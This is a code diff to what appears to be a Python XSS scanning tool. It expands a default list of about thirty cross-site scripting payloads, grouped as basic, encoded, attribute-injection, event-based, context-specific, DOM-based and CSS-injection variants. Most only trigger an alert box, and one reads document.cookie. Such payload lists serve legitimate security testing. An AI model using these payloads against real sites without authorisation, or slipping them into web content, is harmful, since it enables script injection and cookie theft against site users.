@@ -9,14 +9,48 @@ from concurrent.futures import ThreadPoolExecutor
 
 # 🎯 Default XSS Payloads
 DEFAULT_PAYLOADS = [
+    # Basic Payloads
     "<script>alert('XSS')</script>",
     "'\"><script>alert('XSS')</script>",
     "<img src='x' onerror='alert(\"XSS\")'>",
     "<svg/onload=alert('XSS')>",
+
+    # Encoded Variants
     "%3Cscript%3Ealert%28'XSS'%29%3C%2Fscript%3E",
-    "';alert('XSS');//",
-    "javascript:alert('XSS')",
+    "<scr\0ipt>alert('XSS')</scr\0ipt>",
+    "<svg onload=\u0061lert('XSS')>",
+
+    # Attribute Injection
     "' onfocus='alert(\"XSS\")' autofocus='true",
+    "'><svg/onload=alert('XSS')>",
+    "'><img src=x onerror=alert('XSS')>",
+    "' onmouseover='alert(\"XSS\")' style='position:absolute;top:0;left:0;width:100%;height:100%' ",
+
+    # Event-based Payloads
+    "<a href='javascript:alert(\"XSS\")'>Click Me</a>",
+    "<body onload=alert('XSS')>",
+    "<video><source onerror='alert(\"XSS\")'></video>",
+    "<svg><animate attributeName='href' values='javascript:alert(\"XSS\")'></animate></svg>",
+
+    # Context-Specific
+    "';alert('XSS');//",
+    "\";alert('XSS');//",
+    "'+alert('XSS')+'",
+    "</script><script>alert('XSS')</script>",
+
+    # DOM-Based XSS
+    "javascript:alert(document.cookie)",
+    "data:text/html,<script>alert('XSS')</script>",
+    "#<script>alert('XSS')</script>",
+
+    # CSS Injection
+    "<style>@import 'javascript:alert(\"XSS\")';</style>",
+    "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
+    "<style>body{background-image:url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>')}</style>",
+
+    # Other Variants
+    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+    "<details open ontoggle=alert('XSS')><summary>X</summary></details>",
 ]
 
 visited_urls = set()
